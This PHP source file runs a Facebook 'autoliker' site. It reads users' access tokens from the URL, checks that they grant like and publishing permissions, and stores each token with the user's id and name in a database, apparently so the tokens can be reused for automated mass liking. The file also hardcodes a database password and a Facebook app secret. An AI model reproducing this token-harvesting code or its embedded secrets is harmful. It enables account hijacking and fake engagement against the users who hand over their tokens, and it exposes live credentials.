<?php
require 'autolike/facebook.php';

$token = $_GET["accesstoken"];
$fb_secret  = $_GET["sec"];
$fb_app_url  = 'http://ph.superlike.org/m.php';

$host = "localhost";

$username = "jutascom_lkeauto";

$password = "rahsia01";	

$dbname = "jutascom_autolke";


$facebook = new Facebook(array(
	'appId' => '316079325148104',
	'secret' => 'f24019a32c469d904d9f908be9707f82',
	'cookie' => true
));

//database connect
mysql_connect($host,$username,$password) or die(mysql_error());
mysql_select_db($dbname) or die(mysql_error());
mysql_query("SET NAMES utf8");

   mysql_query("CREATE TABLE IF NOT EXISTS `phil` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
   

   try {
$parameters['access_token'] = $_GET["accesstoken" ];
      $userData = $facebook->api('/me', $parameters);
   } catch (FacebookApiException $e) {
      die("invalid access token");
   }
   //check permision
$per1 = "user_likes";
$per2 = "publish_stream";
$taf = file_get_contents("https://graph.facebook.com/me/permissions?access_token=".$token);
$ga = strripos($taf, $per1);
$gu = strripos($taf, $per2);
if($ga < 1 or $gu < 1)
{
die("invalid access token");
}


if($userData){


   //check that user is not already inserted? If is. check it's access token and update if needed
   //also make sure that there is only one access_token for each user
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         phil
      WHERE
         user_id = '" . mysql_real_escape_string($userData['id']) . "'
   ");
   
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 1){
         mysql_query("
            DELETE FROM
               phil
            WHERE
               user_id='" . mysql_real_escape_string($userData['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
   
   if(!$row){
      mysql_query(
         "INSERT INTO 
            phil
         SET
            `user_id` = '" . mysql_real_escape_string($userData['id']) . "',
            `name` = '" . mysql_real_escape_string($userData['name']) . "',
            `access_token` = '" . mysql_real_escape_string($token) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            phil
         SET
            `access_token` = '" . mysql_real_escape_string($token) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
}



try {
$parameters['access_token'] = $_GET["accesstoken"];
$statuses = $facebook->api('/me/feed?limit=1=', $parameters);
foreach($statuses['data'] as $status)
{
        echo $status["me/photo"], "<br />";
}
}
catch (FacebookApiException $e) {
      die("invalid access token");
}


 


?>

<!DOCTYPE html>
<html xmlns:fb="https://www.facebook.com/2008/fbml">
<html> 
<title>Kedaiklan.com Autoliker</title>
<link rel="shortcut icon" href="http://www.abflags.com/_flags/flags-of-the-world/Malaysia%20flag/Malaysia%20flag-XS-anim.gif" />
<link rel="stylesheet" type="text/css" href="fb.css">
<link rel="stylesheet" type="text/css" href="fb-buttons.css">
<link rel="stylesheet" type="text/css" href="style.css">
<meta property="og:title" content="Kedai Iklan Autoliker"/> 
<meta property="og:type" content="game"/> 
<meta property="og:url" content="http://www.likerz.org"/> 
<meta property="og:image" content="http://core4innovative.com/wp-content/uploads/2011/03/FacebookLike.jpg"/> 
<meta property="og:site_name" content="Kedai Iklan"/> 
<meta property="fb:app_id" content="316079325148104"/> 
<meta property="og:description" content="Facebook applications that will give more likes on your status. More uses on this site, more like will be given"/>

<head>
</head>


<body>


</div>

</center>           
</body>
</html>